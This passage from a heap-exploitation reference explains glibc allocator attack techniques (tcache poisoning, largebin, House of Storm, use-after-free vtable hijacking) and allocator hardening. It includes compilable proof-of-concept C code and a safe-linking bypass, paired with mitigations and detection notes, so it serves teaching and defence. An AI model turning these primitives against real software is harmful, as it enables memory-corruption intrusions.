└───────────────────────────────┘
```

**Detection artifacts.** In heap forensics: a free chunk whose size spans memory that is still actively used by the program. Metadata inconsistencies where `prev_size` values do not match corresponding chunk size fields.

**Mitigations.** glibc checks during coalescing that `prev_size == chunk_size(prev_chunk)` — the `prev_size` stored at the coalescing chunk must match the size field of the chunk being coalesced with. The attacker must plant a matching fake size field at the target address. Modern glibc versions also validate that the chunk being unlinked is actually in a bin.

### 5.7 House of Storm

**Corruption needed.** Corrupt both an unsorted-bin chunk's `bk` (for the unsorted-bin-attack write) and a large-bin chunk's `bk` and `bk_nextsize` (for the large-bin insertion manipulation).

**Mechanism.** The technique chains two allocator operations:

1. The unsorted-bin attack (§5.5) writes a libc address (`main_arena+88` or similar) to a chosen location.
2. During the same `_int_malloc` iteration, a large-bin chunk's insertion logic writes a second controlled value via corrupted `bk_nextsize`. The combined writes create a fake chunk at a target address with a valid-looking size field.
3. The next allocation of the appropriate size returns the fake chunk at the target address.

This gives an arbitrary-allocation primitive from two corrupted pointers in different bin types.

**Mitigations.** The unsorted-bin checks in glibc 2.29+ break the unsorted-bin-attack component. Large-bin insertion checks in recent glibc versions add further constraints on `bk_nextsize`.

### 5.8 Poison null byte (off-by-one null)

The poison null byte is not a standalone technique but a root-cause corruption that enables House of Einherjar and overlapping-chunk attacks. It deserves standalone treatment because it arises from extremely common programming errors.

**Root cause.** An off-by-one error that writes a null byte one past the end of a buffer. Classic source: `for (i = 0; i <= len; i++)` instead of `< len`, or `strncpy` that does not null-terminate and the program later writes a `\0` at position `buf[size]`.

**Step-by-step memory state.** Assume three chunks A (0x100 bytes), B (0x210 bytes), C (0x100 bytes) allocated consecutively:

```
Address      Content                   Notes
────────     ───────────────────────   ─────────────────
0x10000      A's prev_size (0)
0x10008      A's size (0x101)          0x100 + PREV_INUSE
0x10010      A's user data             ← malloc returns this
...
0x10100      B's prev_size (0)         (A is in-use, so this is A's data)
0x10108      B's size (0x211)          0x210 + PREV_INUSE
0x10110      B's user data
...
0x10310      C's prev_size (0)
0x10318      C's size (0x101)          0x100 + PREV_INUSE
```

After the null-byte overflow from B (writing one byte past B's user data):

```
0x10318      C's size: 0x100           PREV_INUSE cleared!
```

The attacker also arranges for C's `prev_size` (at 0x10310) to contain `0x210` (B's original size). When C is freed, the allocator coalesces backward by `prev_size = 0x210`, believing a free chunk starts at `0x10310 - 0x210 = 0x10100`. But 0x10100 is inside B's user data, or (if B has been freed and reallocated as smaller chunks) overlaps with live data.

**Mitigations.** The `prev_size == chunksize` check during coalescing, `FORTIFY_SOURCE` for common string functions, and ASan for development-time detection.

### 5.9 Largebin attack

**Corruption needed.** Corrupt the `bk_nextsize` pointer of a large-bin chunk.

**Mechanism.** When a new chunk is inserted into a large bin and it is smaller than the current smallest chunk in the bin, the insertion code updates the `bk_nextsize` chain:

```c
victim->bk_nextsize = fwd->bk_nextsize;
victim->bk_nextsize->fd_nextsize = victim;  /* THE WRITE */
fwd->bk_nextsize = victim;
victim->fd_nextsize = fwd;
```

If the attacker corrupts `fwd->bk_nextsize` to `target_address - 0x20` (offset of `fd_nextsize` from chunk start), then `victim->bk_nextsize->fd_nextsize = victim` writes the address of `victim` (a heap address) to `target_address`. This gives a write-of-heap-address primitive.

Combined with other techniques (e.g., writing to `mp_.tcache_bins` to expand tcache coverage, or to `_IO_list_all`), the largebin attack provides a useful building block in modern exploitation chains.

**Mitigations.** glibc 2.30+ adds integrity checks on large-bin `bk_nextsize` during insertion.

---

## 6. Tcache-specific techniques

### 6.1 Tcache poisoning

**Corruption needed.** Overwrite the `next` pointer of a freed tcache entry with a target address.

**Mechanism.** When a chunk is in a tcache bin, its user data area (offset +0x00 from the user data pointer) contains the `next` pointer to the next free chunk in the bin. If the attacker can corrupt this pointer (via UAF write, heap overflow, or type confusion), the freelist is poisoned:

```
Before corruption:
tcache_bin → [chunk_A: next → chunk_B] → [chunk_B: next → NULL]

After overwriting chunk_A's next with target_addr:
tcache_bin → [chunk_A: next → target_addr] → [target_addr: ...]

malloc() returns chunk_A
malloc() returns target_addr  ← arbitrary allocation
```

```c
/* Tcache poisoning — pre-safe-linking (glibc < 2.32) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    uint64_t target_var = 0;
    printf("target_var at: %p\n", &target_var);

    void *a = malloc(0x20);
    void *b = malloc(0x20);  /* prevent consolidation with top */

    free(a);
    /* a is now in tcache bin for size 0x30.
       a's user data begins with the 'next' pointer (== NULL). */

    /* Simulate a UAF write: overwrite a's next pointer */
    *(uint64_t *)a = (uint64_t)&target_var;

    /* First malloc returns a (the head) */
    void *c = malloc(0x20);
    /* Second malloc follows the poisoned 'next' → returns &target_var */
    void *d = malloc(0x20);

    printf("d = %p (should be %p)\n", d, &target_var);
    /* Now writing to d overwrites target_var */
    *(uint64_t *)d = 0x4141414141414141;
    printf("target_var = 0x%lx\n", target_var);

    return 0;
}
```

**With safe-linking (glibc 2.32+):** The attacker must encode the target address using the XOR scheme. If the heap page address is known (leaked from a one-element tcache bin as described in §3.2):

```c
/* Safe-linking bypass: encode the target pointer */
uint64_t heap_page_key = ((uint64_t)a) >> 12;
*(uint64_t *)a = (uint64_t)&target_var ^ heap_page_key;
```

**Detection artifacts.** Tcache entries whose `next` pointers (after decoding safe-linking, if applicable) point outside the heap region. In ASan, UAF writes are detected immediately.

**Mitigations.** Safe-linking (glibc 2.32+) requires a heap address leak. The alignment check added alongside safe-linking verifies that the returned pointer is properly aligned, preventing the misalignment tricks used in fastbin attacks.

### 6.2 Tcache house of spirit

Same as House of Spirit (§5.2) but targeting tcache instead of fastbins. Tcache has fewer sanity checks than fastbins: no next-chunk-size verification (pre-glibc 2.32), making it easier to construct fake chunks. Only the size field must fall within tcache range (32–1040 bytes on 64-bit). Safe-linking and the tcache key are the main defenses in modern glibc.

### 6.3 Tcache stashing unlink

**Corruption needed.** Corrupt the `bk` pointer of a small-bin chunk when the corresponding tcache bin is not full.

**Mechanism.** When `_int_malloc` removes a chunk from a small bin (step 3 in §4.1), it performs the "tcache stashing" optimization: after serving the requested chunk, it moves remaining chunks from the same small bin into the tcache bin until the tcache bin is full. The stashing loop:

```c
/* Simplified from glibc _int_malloc small-bin path */
while (tcache->counts[tc_idx] < mp_.tcache_count
       && (tc_victim = last(bin)) != bin) {
    /* tc_victim = bin->bk (the last element) */
    bck = tc_victim->bk;
    /* safe-unlink-style check (added in glibc 2.30) */
    if (__glibc_unlikely(bck->fd != tc_victim)) {
        malloc_printerr("...");
    }
    bin->bk = bck;
    bck->fd = bin;
    tcache_put(tc_victim, tc_idx);
}
```

If the attacker corrupts the `bk` pointer of a small-bin chunk (the one that will be stashed), the loop writes `bin` (a `main_arena` address) to `bck->fd` — an arbitrary write of a libc address, similar to the unsorted-bin attack. Additionally, the fake `bck` chunk gets stashed into the tcache, potentially giving an arbitrary-allocation primitive on the next `malloc`.

**Mitigations.** glibc 2.30+ added the `bck->fd != tc_victim` check in the stashing loop, making this technique harder. Earlier versions (glibc 2.26–2.29) did not check.

---

## 7. Use-after-free and double-free in userspace

### 7.1 UAF exploitation lifecycle

A userspace UAF follows the same pattern as the kernel UAF (Domain 5, Chapter 5A §3) at a different layer. The lifecycle has four distinct phases:

**Phase 1: Allocation.** The program allocates an object on the heap. The object may contain function pointers (C callbacks), vtable pointers (C++ virtual objects), data pointers (to other heap objects), or security-sensitive fields (privilege flags, size values).

**Phase 2: Free.** The object is freed. The allocator reclaims the memory and inserts the chunk into a freelist (tcache, fastbin, or a coalescing bin). The chunk's user-data area is partially overwritten with freelist metadata (`next`/`fd` pointers, `key` field).

**Phase 3: Dangling pointer retained.** The program retains a pointer to the freed object. This can occur due to: failure to null the pointer after `free`, copying the pointer to another variable before `free`, returning the pointer from a function that also frees it, or storing the pointer in a data structure that is not updated after the `free`.

**Phase 4: Reallocation and type confusion.** The attacker triggers an allocation of the same size. The allocator reuses the freed chunk (LIFO behavior in tcache/fastbins makes this predictable). The attacker controls the content written into the new allocation, which now overlaps with the dangling pointer's target. When the program uses the dangling pointer, it interprets attacker-controlled data as the original object's fields.

```c
/* UAF exploitation — function pointer hijack */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*handler)(const char *msg);
    char name[24];
} plugin_t;

void safe_handler(const char *msg) {
    printf("[plugin] %s\n", msg);
}

int main(void) {
    /* Phase 1: Allocation */
    plugin_t *p = malloc(sizeof(plugin_t));
    p->handler = safe_handler;
    strcpy(p->name, "logger");

    /* Phase 2: Free */
    free(p);
    /* Phase 3: p is still accessible (dangling pointer) */

    /* Phase 4: Attacker-controlled reallocation of same size */
    char *evil = malloc(sizeof(plugin_t));
    /* Overwrite the handler field with attacker's address */
    *(void (**)(const char *))evil = (void (*)(const char *))0x41414141;

    /* Program uses dangling pointer — calls corrupted handler */
    p->handler("trigger");  /* jumps to 0x41414141 */

    return 0;
}
```

### 7.2 Heap spray for UAF

When the attacker cannot precisely control which allocation reuses the freed chunk (e.g., in a browser or complex application), heap spraying increases the probability. The attacker allocates many objects of the same size, filling them with controlled data (e.g., a fake vtable pointer or a desired value for a security-sensitive field).

The allocation pattern exploits LIFO behavior: after the target object is freed, the attacker performs many allocations of the same size. If the tcache bin was empty, the freed chunk is returned first, then subsequent allocations come from other bins or the top chunk. If the tcache bin had entries, the freed chunk may be returned later. By spraying enough same-size allocations, the attacker ensures the freed slot is eventually reused with controlled content.

For targeted reuse in multi-threaded applications, the attacker may need to perform allocations from the same thread that freed the target object (since tcache is per-thread).

### 7.3 Real CVEs — UAF exploitation

**CVE-2021-22555 (Linux Netfilter, CVSS 7.8, CWE-787/CWE-416).** A heap out-of-bounds write in `xt_compat_target_from_user()` in the Netfilter `IPT_SO_SET_REPLACE` path. The bug: `memset` zeroed two bytes past the end of a slab-allocated `xt_entry_target` structure, corrupting the adjacent slab object's metadata. The exploiter used `msg_msg` objects (allocated from the same slab cache) as the corruption target. By corrupting `msg_msg.m_list.next`, they achieved an arbitrary read. Then, by corrupting `msg_msg.m_ts` (message size), they achieved an arbitrary write on the subsequent `msgrcv` call. The exploit chain: kernel info leak → pipe buffer manipulation → overwrite `modprobe_path` → privilege escalation. This is technically a heap OOB write rather than a pure UAF, but the exploitation pattern (corrupting a freed/adjacent object's metadata for type confusion) is the same.

**CVE-2022-0185 (Linux `legacy_parse_param`, CVSS 8.4, CWE-190/CWE-122).** An integer overflow in the `fs_context` subsystem's `legacy_parse_param()` function led to a heap buffer overflow. The 1-byte underflow in `snprintf` return value handling allowed writing past the end of a heap buffer. Exploitation used `msg_msg` and `msg_msgseg` kernel structures for heap feng shui: by arranging slab objects of specific sizes adjacent to the overflowed buffer, the attacker could corrupt `msg_msg` headers to achieve arbitrary read/write, then overwrite `modprobe_path` for root.

**Chrome UAF CVEs.** The Chromium browser has been a prolific source of UAF vulnerabilities due to the complexity of its DOM, V8 JavaScript engine, and Blink rendering engine:

- **CVE-2021-21224 (V8 type confusion, CVSS 8.8):** A type confusion in V8 allowed a remote attacker to execute arbitrary code via a crafted HTML page. The bug was in V8's handling of certain integer operations where the engine's type inference was incorrect, allowing an attacker to cause the JIT compiler to generate code that operated on an object using the wrong type assumptions. This created a memory corruption primitive that could be escalated to arbitrary code execution within the renderer sandbox.

- **Blink DOM UAFs (recurring pattern):** A DOM node is freed (e.g., by removing it from the document), but a JavaScript reference or an internal C++ pointer retains access. The attacker triggers garbage collection or DOM mutation, the freed node's memory is reused for a new object, and the stale reference now accesses the wrong object type. This pattern has generated hundreds of CVEs in Chromium's lifetime.

### 7.4 Double-free

A double-free is a specific case: the same pointer is passed to `free` twice. The allocator inserts the chunk into a bin twice, creating a cycle or duplicate entry. Subsequent allocations return the same memory twice — allowing the attacker to write to the same location through two "different" allocations. The fastbin dup (§3.1) is the canonical exploitation of double-free.

Mitigations: tcache's `key`-based double-free detection (§3.2), fastbin's consecutive-free check, and runtime sanitizers (ASan detects double-free immediately with a `heap-use-after-free` error).

### 7.5 Detection approaches

**Development-time.** AddressSanitizer (ASan) instruments `malloc`/`free` and poisons freed memory with `0xBE` bytes. Any read/write through a dangling pointer triggers an immediate error with a stack trace showing both the `free` site and the invalid access site. ASan also detects double-free and heap buffer overflow. Overhead: ~2x memory, ~2x CPU.

**Production detection.** Heap canaries (allocator-specific cookies placed in chunk metadata) detect corruption at `free` time but not at use time. Freed-memory poisoning (writing patterns like `0xFEFEFEFE` to freed blocks) causes predictable crashes when dangling pointers are dereferenced, making UAF bugs more likely to crash (and thus be detected) rather than silently corrupt memory. ARM MTE (§9.7) provides probabilistic detection in production with ~3% overhead.

**Forensic artifacts.** In crash dumps: an object whose fields contain freelist metadata patterns (`fd`/`bk` pointers into heap or `main_arena`) — this indicates the object was freed and reused by the allocator. A vtable pointer that points into heap data (rather than the `.rodata` or `.data.rel.ro` section where legitimate vtables reside) suggests UAF-based vtable hijacking.

---

## 8. C++ type confusion

### 8.1 C++ object memory layout and vtables

A C++ class with at least one virtual method contains a **vtable pointer** (vptr) as its first hidden field. The compiler inserts the vptr at offset 0 of the object, before any declared member variables:

```
C++ object layout (single inheritance, 64-bit):

Offset   Size    Content
──────   ────    ───────────────────
+0x00    8       vptr → vtable for this class
+0x08    ...     member variables (in declaration order)
```

The vtable itself is an array of function pointers in the `.rodata` or `.data.rel.ro` section:

```
vtable for class Derived:

Offset   Content
──────   ───────────────────────────────
+0x00    offset_to_top (for dynamic_cast)
+0x08    pointer to typeinfo for Derived
+0x10    &Derived::virtual_func_1     ← vptr points here
+0x18    &Derived::virtual_func_2
+0x20    &Base::virtual_func_3        (inherited, not overridden)
...
```

The vptr stored in the object points to the *first virtual function pointer entry* (offset +0x10 in the example), not to the beginning of the vtable structure. The entries before it (offset-to-top and typeinfo pointer) are at negative offsets relative to vptr.

A virtual call `obj->virtual_func_1()` compiles to:

```asm
; x86_64: obj in rdi
mov    rax, [rdi]          ; load vptr
call   [rax]               ; call first vtable entry
```

This double indirection (load vptr, then load function pointer from vtable) is the attack surface: corrupting either the vptr or the vtable contents redirects virtual calls.

### 8.2 Vtable pointer corruption via UAF

The most common path to vtable hijacking is through UAF:

1. A C++ object with virtual methods is allocated on the heap.
2. The object is freed, but a pointer (or reference) to it persists.
3. The attacker allocates a replacement buffer of the same size and fills it with controlled data, placing a fake vptr at offset 0.
4. The program calls a virtual method through the dangling pointer. The call loads the fake vptr, follows it to a fake vtable, and calls the attacker's address.

```c
/* C++ vtable hijacking via UAF — conceptual */
#include <cstdio>
#include <cstdlib>
#include <cstring>

class Base {
public:
    virtual void action() { printf("Base::action\n"); }
    virtual ~Base() {}
    int data;
};

int main() {
    /* Phase 1: Allocate object with virtual methods */
    Base *obj = new Base();
    obj->data = 42;

    /* Phase 2: Delete the object (freed, memory returned to heap) */
    delete obj;

    /* Phase 3: Reallocate same-size buffer with controlled content */
    size_t obj_size = sizeof(Base);  /* typically 16 bytes on 64-bit */
    char *evil = (char *)malloc(obj_size);

    /* Place a fake vptr at offset 0.
       In a real exploit, this would point to a fake vtable
       containing ROP gadgets or a one-gadget address. */
    unsigned long fake_vtable[4] = {
        0, 0,
        0x41414141,  /* fake virtual_func_1 */
        0x42424242   /* fake virtual_func_2 */
    };
    *(unsigned long *)evil = (unsigned long)&fake_vtable[2];

    /* Phase 4: Use dangling pointer — virtual call through fake vtable */
    /* obj->action() would now jump to 0x41414141 */
    obj->action();  /* CRASH or code execution */

    return 0;
}
```

### 8.3 Type confusion via bad cast

Type confusion does not require UAF. A `static_cast` to the wrong derived type produces an object reference with incorrect type assumptions:

```cpp
class Shape { public: virtual void draw() = 0; };
class Circle : public Shape {
public:
    double radius;
    void draw() override { /* ... */ }
};
class Rect : public Shape {
public:
    double width, height;
    void draw() override { /* ... */ }
    void resize(double w, double h) { width = w; height = h; }
};

/* Attacker controls 'type' field through an input: */
void process(Shape *s, int type) {
    if (type == 1) {
        Rect *r = static_cast<Rect *>(s);  /* no runtime check */
        r->resize(100, 200);
        /* If s is actually a Circle, this writes to Circle::radius
           and past the object boundary */
    }
}
```

`static_cast` performs no runtime check — it trusts the programmer's assertion. If the actual object is a `Circle` (which has a different layout), `resize` writes to memory at the offsets where `Rect` expects `width` and `height`, but the `Circle` object may not have fields at those offsets, causing out-of-bounds write or corruption of adjacent heap data.

In browser engines, type confusion is particularly dangerous because JavaScript can trigger C++ code paths with unexpected object types. The V8 engine's JIT compiler optimizes based on type feedback; if the type feedback is wrong (due to a bug in the feedback mechanism), the generated machine code operates on objects using incorrect type assumptions — a JIT-spray-adjacent class of vulnerability.

### 8.4 `typeid`/`dynamic_cast` bypass via vtable corruption

`typeid` and `dynamic_cast` rely on RTTI (Run-Time Type Information) structures referenced from the vtable. The typeinfo pointer sits at offset -8 relative to the vptr target (i.e., one slot before the first virtual function pointer in the vtable).

If the attacker controls the vtable (via UAF or heap corruption), they control the RTTI pointer, allowing:

- **`typeid` manipulation.** `typeid(*obj)` follows vptr → typeinfo pointer → `type_info` structure. A fake typeinfo with a controlled `__name` field can cause code that dispatches based on `typeid` comparisons (e.g., using `typeid(*obj) == typeid(AdminUser)`) to misidentify the object type, escalating privileges.

- **`dynamic_cast` bypass.** `dynamic_cast<Derived*>(base)` uses the typeinfo hierarchy to verify the cast. A fake typeinfo that declares the object as an instance of the target type causes `dynamic_cast` to succeed for a cast that should fail. Conversely, the attacker can make `dynamic_cast` fail for a valid cast, causing null-pointer dereferences in code that does not check the return value.

**Real CVE: CVE-2020-0674 (Internet Explorer, CVSS 7.5, CWE-843).** A type confusion vulnerability in Internet Explorer's JScript scripting engine (`jscript.dll`). The bug was in the `JScript` garbage collector's handling of certain objects: during garbage collection, the engine confused the type of a scripting object, treating an object of one type as another. An attacker who crafted a malicious web page could trigger the type confusion, gaining a read/write primitive over JScript objects, which was escalated to arbitrary code execution via a fake vtable. This is representative of the browser type-confusion pattern: complex object hierarchies with polymorphic dispatch, where a single incorrect type assumption cascades into memory corruption.

### 8.5 Defenses against type confusion

**`-fvtable-verify` (GCC VTV).** Inserts runtime checks that validate vtable pointers against a set of known-valid vtables compiled into the binary. At each virtual call site, the instrumentation verifies that the vptr points to a vtable registered for a compatible class type. Catches vtable corruption but has performance overhead (1–5%) and incomplete coverage (does not protect against corruption of non-vtable function pointers).

**Clang CFI (Control Flow Integrity, cross-reference Domain 4 §13).** A suite of instrumentation passes:
- `cfi-vcall`: validates that the vtable pointer at a virtual-call site points to a vtable of a compatible class type. Uses type metadata embedded in the binary.
- `cfi-icall`: validates indirect C function calls against the expected function signature.
- `cfi-derived-cast` and `cfi-unrelated-cast`: validate `static_cast` and `reinterpret_cast` operations at runtime.
- `cfi-nvcall`: validates non-virtual member-function calls.
Together, these provide comprehensive type-safety enforcement for C++ dispatch. CFI is used in production by Chrome (on Android and Linux), Android system services, and other security-critical software.

**Memory safety.** Languages with automatic memory management (Rust, Go, Java) eliminate UAF, double-free, and buffer overflow by construction. For C/C++ codebases, memory-safety sanitizers (ASan, MSan, UBSan) catch these bugs in testing. Hardware features (MTE on AArch64 — §9.7) provide probabilistic runtime detection in production.

---

## 9. Allocator hardening landscape

This section surveys how different allocators have evolved to resist the techniques described above. The threat model has shifted from "one corruption primitive gives code execution" to "the attacker needs multiple independent leaks and corruptions, each bypassing a different hardening layer."

### 9.1 glibc (ptmalloc2) hardening evolution

| glibc Version | Year | Hardening Addition |
|---------------|------|--------------------|
| 2.3.x | 2004 | Safe unlink (`FD->bk == P && BK->fd == P`) |
| 2.24 | 2016 | `_IO_FILE` vtable validation (vtable must be in `__libc_IO_vtables`) |
| 2.26 | 2017 | Tcache introduced (performance, not hardening — initially weakened security) |
| 2.27 | 2018 | Tcache double-free detection via `key` field |
| 2.29 | 2019 | Top chunk size validation (kills House of Force); unsorted bin `bk` consistency check |
| 2.30 | 2019 | Tcache stashing unlink integrity check; large-bin insertion checks |
| 2.32 | 2020 | Safe-linking (XOR obfuscation of `fd`/`next` pointers); alignment checks on tcache/fastbin returns |
| 2.34 | 2021 | Random tcache key (replaces pointer-based key); removal of `__malloc_hook` / `__free_hook` / `__realloc_hook` |
| 2.35 | 2022 | Additional fastbin/tcache pointer mangling; `_IO_FILE` further hardened |

The removal of `__malloc_hook` and `__free_hook` in glibc 2.34 was a major hardening step. These were writable function pointers in libc's `.data` segment, called on every `malloc`/`free` — a trivial code-execution target for any write primitive. Their removal forces attackers to use more complex targets (FSOP chains, `_IO_FILE` manipulation, GOT overwrites where RELRO is not full).

### 9.2 Safe-linking in depth

Safe-linking (glibc 2.32+) protects singly-linked freelist pointers (`fd` in fastbins, `next` in tcache) by XORing them with a secret derived from the pointer's storage location:

```
stored_ptr = real_ptr XOR (storage_address >> 12)
```

The `>> 12` shift aligns the secret to page boundaries (4096 bytes), meaning all entries within the same page share the same XOR key. This is a deliberate tradeoff: a single leak reveals the key for an entire page.

**Bypass conditions:**
1. Heap address leak to page granularity (4 KB). As noted in §3.2, the first entry in a tcache bin with `next = NULL` stores `0 ^ (addr >> 12) = (addr >> 12)`, directly revealing the key.
2. Partial overwrite. If the attacker can only overwrite the lower bytes of the `next` pointer, the XOR key for the upper bytes is already correct (since those bytes came from the original encoding). A partial overwrite of the lower 2 bytes (within the same page) does not change the page-level key.

Safe-linking raises the bar from "one write primitive → arbitrary allocation" to "one write primitive + one heap leak → arbitrary allocation." It is not a fundamental barrier but eliminates a class of trivial exploits.

### 9.3 jemalloc

jemalloc (used by FreeBSD, Firefox historically, many performance-sensitive applications) takes a fundamentally different approach from ptmalloc2:

- **Slab allocator.** Small allocations are served from "slabs" — contiguous regions divided into fixed-size slots. Each slab serves one size class. The slab metadata (including the freelist bitmap) is stored separately from the slab data, not inline with the chunks.
- **Separated metadata.** Because freelist pointers are not stored in the user-data area of free chunks, corrupting freed chunks does not directly corrupt freelist pointers. This defeats tcache poisoning and fastbin-dup-style attacks by design.
- **Quarantine zones.** jemalloc can be configured to delay reuse of freed memory, placing it in a quarantine before returning it to the freelist. This reduces the UAF window.
- **Thread caches.** Similar to ptmalloc2's tcache but with different implementation details.

jemalloc's separation of metadata from user data is the most security-relevant design difference. Attacks that rely on corrupting inline freelist pointers (which is the majority of ptmalloc2 techniques) do not apply.

### 9.4 mimalloc

mimalloc (Microsoft Research, used in some Microsoft products) is designed for performance with security features:

- **Segment isolation.** Memory is organized into segments (large aligned regions), each containing pages of a single size class. Cross-size-class corruption is harder because different sizes live in different pages.
- **Free list encoding.** Free list pointers are XOR-encoded with a per-page random key (similar to glibc's safe-linking but predating it).
- **Guard pages.** Optional guard pages between segments for detecting out-of-bounds access.
- **Eager decommit.** Freed memory can be decommitted (returned to the OS as uncommitted pages), causing SIGSEGV on any access through a dangling pointer — strong UAF mitigation at the cost of increased page-fault overhead.

### 9.5 PartitionAlloc (Chromium)

PartitionAlloc is Chrome's allocator, designed specifically to resist exploitation in a browser threat model:

- **Per-type heaps (bucket isolation).** Different allocation types are served from separate "partitions." A `DOMNode` partition, a `string` partition, and a `ArrayBuffer` partition use completely different heap regions. This prevents the classic UAF exploitation strategy of freeing a typed object and replacing it with a differently-typed object from the same allocator pool.
- **Slot span layout.** Within a partition, memory is organized into "slot spans" — groups of same-size slots. Metadata is stored out-of-line in a separate "metadata bucket."
- **BackupRefPtr (MiraclePtr).** A reference-counting mechanism for raw C++ pointers. When a `BackupRefPtr`-protected pointer's referent is freed, the memory is quarantined (not returned to the freelist) until all `BackupRefPtr` instances are destroyed. This turns UAF into a "use-after-quarantine" — the memory is still valid (not reused), just logically freed. Dereferencing it causes a controlled crash rather than exploitable corruption.
- **MTE integration (on ARM64).** PartitionAlloc integrates with ARM MTE (§9.7) to tag allocations, providing hardware-assisted UAF detection.
- **Lightweight use-after-free detection.** PartitionAlloc can zero-fill freed memory, causing deterministic crashes on UAF rather than exploitation.

### 9.6 Scudo (Android)

Scudo is Android's hardened allocator (replacing jemalloc from Android 11):

- **Primary allocator.** For small/medium allocations, uses a slab-based design with size classes. Metadata is stored in a per-chunk header (8 bytes or 16 bytes) containing a checksum, size class, and state (allocated/free).
- **Secondary allocator.** For large allocations, uses `mmap` with guard pages.
- **Header checksum.** Each chunk header includes a CRC32 checksum (keyed with a per-process random cookie). Corrupting any header field (size, state, or checksum) is detected at the next `free` or `realloc`. This defeats header corruption techniques (size field overwrites, flag manipulation).
- **Quarantine.** Freed chunks are placed in a quarantine ring buffer before being returned to the freelist. The quarantine delays reuse, reducing the UAF exploitation window. The quarantine size is configurable.
- **RSS compression.** Scudo is designed to have lower memory overhead than jemalloc while maintaining security properties.
- **Freed-memory filling.** Scudo fills freed memory with a pattern, causing immediate corruption of any freelist metadata if the memory is accessed through a dangling pointer.

### 9.7 ARM MTE (Memory Tagging Extension)

ARM MTE is a hardware feature (introduced in ARMv8.5-A, available in Cortex-A715 and later) that provides probabilistic memory safety:

**Mechanism.** Every 16-byte granule of memory is associated with a 4-bit tag stored in dedicated tag memory (separate from the data memory). Pointers also carry a 4-bit tag in bits [59:56] (the "top byte" — bits that are ignored by the MMU due to TBI, Top Byte Ignore). On every memory access, the hardware compares the pointer's tag with the memory's tag. A mismatch triggers a tag-check fault.

```
Tagged pointer:     0x0A00_7FFF_8000_1230
                     ^^
                     tag = 0x0A

Memory at 0x7FFF_8000_1230: tag = 0x0A  → match, access allowed
After free, tag changes:    tag = 0x05  → mismatch, fault
```

**Tag granularity.** Tags are assigned per 16-byte granule. Allocations are tagged at allocation time; the tag is randomized. On `free`, the memory's tag is changed to a different random value. A dangling pointer retains the old tag, which no longer matches — subsequent access triggers a fault.

**Residual probability.** With 4 bits, there are 16 possible tag values. A random tag match has probability 1/16 ≈ 6.25%. This means MTE is probabilistic: a single UAF access has a 93.75% chance of detection. Repeated access or multiple UAF instances improve detection probability. For an attacker who must reliably exploit a UAF (e.g., spray 100 objects), the probability of avoiding detection across all accesses drops exponentially.

**Checking modes.** MTE supports two modes:
- **Synchronous (sync) mode.** Tag mismatches raise an immediate synchronous exception. Highest detection fidelity, but higher performance overhead (~3–5%).
- **Asynchronous (async) mode.** Tag mismatches are recorded in a system register and reported at a later synchronization point (e.g., context switch, explicit `DMB` barrier). Lower overhead (~1–3%) but delayed detection — an exploit might complete before the fault is reported.

**Adoption.** As of 2025, MTE is supported in Android 14+ (opt-in per-app), Chrome (on Android ARM64 devices), and several ARM server platforms. Kernel MTE (KASAN-HW) uses MTE for kernel memory safety with minimal overhead.

### 9.8 Technique vs. allocator compatibility

The following table summarizes which exploitation techniques work against which allocators. "Yes" means the technique applies in principle; "No" means the allocator's design prevents it; "Partial" means additional constraints or bypasses are required.

```
Technique                  ptmalloc2  ptmalloc2    jemalloc  PartitionAlloc  Scudo
                           (old)      (2.34+)
─────────────────────────  ─────────  ──────────   ────────  ──────────────  ─────
Fastbin dup                Yes        Partial[1]   No[2]     No[2]           No[3]
Tcache poisoning           Yes        Partial[1]   No[2]     No[2]           No[3]
House of Force             Yes        No[4]        No[5]     No[5]           No[3]
House of Spirit            Yes        Partial[1]   No[2]     No[2]           No[3]
House of Orange            Yes        No[6]        No[5]     No[5]           No[3]
Unsorted bin attack        Yes        No[4]        No[5]     No[5]           No[3]
House of Einherjar         Yes        Partial[7]   Partial   Partial         Partial
UAF (type confusion)       Yes        Yes[8]       Yes[8]    Partial[9]      Partial[10]
Largebin attack            Yes        Partial[4]   No[5]     No[5]           No[3]

Notes:
[1]  Safe-linking requires heap address leak
[2]  No inline freelist pointers to corrupt
[3]  Header checksum detects metadata corruption
[4]  Integrity checks in glibc 2.29+
[5]  Completely different allocator design — bins/unsorted bin don't exist
[6]  _IO_FILE vtable validation + hook removal
[7]  prev_size/size consistency checks
[8]  UAF is an application bug, not allocator-specific — all allocators
     are vulnerable unless they have quarantine/reuse mitigation
[9]  BackupRefPtr quarantine prevents reuse for protected pointer types
[10] Quarantine delays reuse but does not prevent it
```

---

## 10. Glibc Heap Evolution Timeline

§9.1 tabulates the major hardening milestones in ptmalloc2. This section examines each glibc release in depth, describing the specific source-level changes, the exploitation techniques each change broke, and the new techniques that emerged in response. Understanding this timeline is essential for exploit developers targeting specific distribution versions (Ubuntu 18.04 ships glibc 2.27; Ubuntu 20.04 ships 2.31; Ubuntu 22.04 ships 2.35; Debian 12 ships 2.36) and for detection engineers determining what exploitation artifacts are possible on a given target.

### 10.1 glibc 2.26 (August 2017) — tcache introduction

glibc 2.26 introduced the per-thread cache (tcache) as a performance optimization, adding a fast allocation path that bypasses the arena mutex entirely. The `tcache_perthread_struct` is allocated as the first chunk on each thread's heap, containing 64 bins covering sizes from 32 to 1040 bytes (64-bit), each holding up to 7 entries in a singly-linked LIFO list.

The security impact was immediately negative. Tcache performed no integrity checks whatsoever on the `next` pointer, no double-free detection, and no size validation on returned chunks. Freeing a chunk into tcache simply wrote the old head into the `next` field and updated the count. Allocating from tcache simply followed `next` without any verification. This made tcache poisoning (§6.1) trivially exploitable: a single UAF write to a freed tcache entry's `next` field produced an arbitrary-allocation primitive with no prerequisites beyond the write itself.

The tcache also changed exploitation dynamics in a subtler way. Because tcache bins are per-thread and LIFO, UAF exploitation became more deterministic: the freed chunk is always returned first on the next same-size allocation from the same thread. This eliminated the need for heap spraying in many scenarios where cross-thread allocation races previously added uncertainty.

```c
/* glibc 2.26 tcache_put — no integrity checks at all */
static void tcache_put(mchunkptr chunk, size_t tc_idx) {
    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
    e->next = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}
```

### 10.2 glibc 2.27 (February 2018) — tcache key for double-free

